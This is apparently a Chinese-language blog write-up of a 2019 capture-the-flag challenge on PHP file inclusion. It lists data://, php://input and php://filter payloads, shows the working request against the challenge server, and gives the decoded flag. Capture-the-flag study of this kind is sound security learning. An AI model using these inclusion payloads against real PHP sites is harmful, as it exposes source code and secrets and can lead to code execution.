---
layout:   post
title:    BasicFileInclude
subtitle:   Hello world,hello blog!
date:     2019-04-15
author:   吴柚
header-img: post-bg-desk.jpg
catalog:    true
tags:
    - 学习
---

## 题目分析

![](https://i.loli.net/2019/04/15/5cb49cc4432f6.png)

从题目名称来看，，这是一个文件包含类型的题目。google以后得知这种题目属于PHP类型。

![](https://i.loli.net/2019/04/15/5cb49cc4f1ae2.png)

打开题目所给网页，这句话的意思是文件就在这，但你看不见。然后看见url栏，看到`page=flag`，应该就代表文件被隐藏在网页源代码中了吧。

然而查看网页源代码，没有什么特别的发现，故google后得知这种题目有以下几种构造payload的做法：

```
1.?file=data:text/plain,<?php phpinfo()?>

2.?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=

3.?file=php://input [POST DATA:]<?php phpinfo()?>

4.?file=php://filter/read=convert.base64-encode/resource=xxx.php
```

## 解题过程

依次使用上述四种不同的PHP伪协议构造payload，来尝试解题。

当payload为:

```
http://123.207.149.64:23338/?page=php://filter/read=convert.base64-encode/resource=flag
```

得到一串base64加密的字符串

![](https://i.loli.net/2019/04/15/5cb49cc5b7d55.png)

字符串为：`aGEgaGE/IHlvdSB3YW50IGZsYWc/IGZsYWcgaXMgaGVyZTw/cGhwDQovLyB0cnkgdG8gcmVhZCB0aGlzIHNvdXJjZSBjb2RlDQovLyRmbGFnID0gJ2ZsYWd7cmVhbGx5X2Jhc2ljX3NraWxsX3dlYl9kb2dfc2hvdWxkX2tub3d9JzsNCj8+LCBidXQgZG9uJ3QgbGV0IHlvdSBzZWUhDQo=`

在线解出该字符串含义，得到flag为`flag{really_basic_skill_web_dog_should_know}`

![](https://i.loli.net/2019/04/15/5cb49cc647de8.png)
